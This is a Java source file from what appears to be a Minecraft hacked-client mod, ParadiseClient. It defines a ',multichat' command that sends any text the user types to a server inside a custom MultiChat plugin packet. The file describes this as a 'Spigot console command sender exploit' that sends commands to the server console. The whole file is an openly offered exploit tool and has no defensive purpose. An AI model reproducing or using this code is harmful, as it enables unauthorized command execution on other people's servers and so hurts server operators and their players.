package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import io.github.spigotrce.paradiseclientfabric.packet.MultichatPayloadPacket;

public class MultichatCommand extends Command {
    public MultichatCommand(MinecraftClient minecraftClient) {
        super("multichat", "Spigot console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return LiteralArgumentBuilder.<CommandSource>literal(this.getName())
            .executes(this::showUsage)
            .then(argument("command", StringArgumentType.greedyString())
                .executes(context -> {
                    String command = context.getArgument("command", String.class);
                    if (command == null || command.trim().isEmpty()) {
                        Helper.printChatMessage("§cError: Command cannot be empty!");
                        return 0;
                    }
                    
                    try {
                        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
                            new MultichatPayloadPacket(command)
                        );
                        Helper.sendPacket(packet);
                        Helper.printChatMessage("§aPayload sent successfully!");
                        return 1;
                    } catch (Exception e) {
                        Helper.printChatMessage("§cError sending payload: " + e.getMessage());
                        return -1;
                    }
                })
            );
    }

    private int showUsage(CommandContext<CommandSource> context) {
        Helper.printChatMessage("§6Usage: ,multichat <command>");
        Helper.printChatMessage("§7Sends a command to Spigot console via multichat exploit");
        return 1;
    }
}
